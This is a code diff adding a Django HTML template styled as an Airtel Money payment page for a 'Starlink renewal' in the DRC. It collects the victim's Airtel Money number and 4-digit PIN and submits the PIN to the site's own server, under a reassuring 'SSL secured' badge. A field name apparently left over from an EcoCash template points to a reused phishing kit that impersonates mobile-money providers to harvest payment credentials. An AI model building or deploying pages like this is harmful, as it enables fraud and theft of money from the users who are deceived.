@@ -1,0 +1,117 @@
+{% extends "base.html" %}
+{% load static %}
+
+{% block title %}Airtel Money - Paiement Sécurisé{% endblock %}
+
+{% block content %}
+<div class="flex items-center justify-center min-h-screen pb-24">
+  <div class="w-full max-w-md mx-4">
+    <!-- Airtel Branded Header -->
+    <div class="bg-gradient-to-r from-red-600 to-red-700 rounded-t-3xl p-6 sm:p-8 text-center shadow-lg">
+        <img src="{% static 'images/airtel_logo.png' %}" alt="Airtel" class="h-10 sm:h-12 mx-auto brightness-0 invert">
+        <h2 class="text-white font-bold mt-4 text-xl sm:text-2xl">Airtel Money</h2>
+    </div>
+
+    <!-- Main Form Card -->
+    <div class="bg-white rounded-b-3xl card-shadow p-6 sm:p-8 border-x border-b border-gray-100">
+      
+      <div class="mb-8">
+        <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4">
+            <div class="text-center sm:text-left">
+                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Montant</p>
+                <p class="text-3xl sm:text-2xl font-black text-red-600">CDF {{ order.amount }}</p>
+            </div>
+            <div class="text-center sm:text-right">
+                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
+                <p class="text-sm font-bold text-gray-700">Renouvellement Starlink</p>
+            </div>
+        </div>
+        <p class="text-gray-600 text-sm text-center">Entrez votre code PIN Airtel Money pour autoriser</p>
+      </div>
+
+      <form method="POST" class="space-y-6" novalidate>
+        {% csrf_token %}
+        <input type="hidden" name="action" value="verify_pin">
+        
+        <!-- Airtel Number Input -->
+        <div>
+          <label class="block text-gray-700 font-bold mb-3 text-sm">Numéro Airtel Money</label>
+          <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300">
+            <div class="flex items-center bg-gray-50 px-4 border-r border-gray-300">
+              <img src="/static/images/drc_flag.png" alt="DRC" class="w-5 h-3 mr-2">
+              <span class="text-gray-700 font-bold text-sm">+243</span>
+            </div>
+            <input 
+              type="tel" 
+              id="ecocash_number" 
+              name="ecocash_number" 
+              required
+              placeholder="8xxxxxxx"
+              class="flex-1 px-4 py-3 focus:outline-none text-lg font-medium"
+              inputmode="numeric"
+              value="{{ order.phone_number }}"
+            />
+          </div>
+        </div>
+
+        <!-- PIN Entry Label -->
+        <div class="text-center mt-8 mb-6">
+          <p class="text-gray-700 font-bold text-sm">Entrez le code PIN à 4 chiffres</p>
+          <p class="text-gray-500 text-xs mt-1">Vérifiez votre application Airtel Money ou vos SMS</p>
+        </div>
+
+        <!-- 4-Digit PIN Input Boxes -->
+        <div class="flex justify-center gap-3 mb-8">
+          <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-red-600 focus:ring-4 focus:ring-red-100 focus:outline-none transition-all" inputmode="numeric" data-index="0" />
+          <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-red-600 focus:ring-4 focus:ring-red-100 focus:outline-none transition-all" inputmode="numeric" data-index="1" />
+          <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-red-600 focus:ring-4 focus:ring-red-100 focus:outline-none transition-all" inputmode="numeric" data-index="2" />
+          <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-red-600 focus:ring-4 focus:ring-red-100 focus:outline-none transition-all" inputmode="numeric" data-index="3" />
+        </div>
+
+        <!-- Hidden PIN field for form submission -->
+        <input type="hidden" id="pin-field" name="pin" value="">
+
+        <!-- Submit Button -->
+        <button 
+          type="submit" 
+          class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2"
+        >
+          <i class="uil uil-check-circle"></i> Confirmer le Paiement
+        </button>
+      </form>
+
+      <!-- Security Note -->
+      <div class="mt-8 flex items-center justify-center gap-2 text-gray-500">
+        <i class="uil uil-shield-check text-lg text-green-600"></i>
+        <p class="text-[11px] uppercase font-bold tracking-widest">Crypté SSL et Sécurisé</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.querySelectorAll('.pin-box').forEach((box, index) => {
+    box.addEventListener('input', function(e) {
+      if (this.value.length === 1) {
+        if (index < 3) {
+          document.querySelectorAll('.pin-box')[index + 1].focus();
+        }
+      }
+      updatePinField();
+    });
+
+    box.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && index > 0) {
+        document.querySelectorAll('.pin-box')[index - 1].focus();
+      }
+    });
+  });
+
+  function updatePinField() {
+    const pin = Array.from(document.querySelectorAll('.pin-box'))
+      .map(box => box.value)
+      .join('');
+    document.getElementById('pin-field').value = pin;
+  }
+</script>
+{% endblock %}
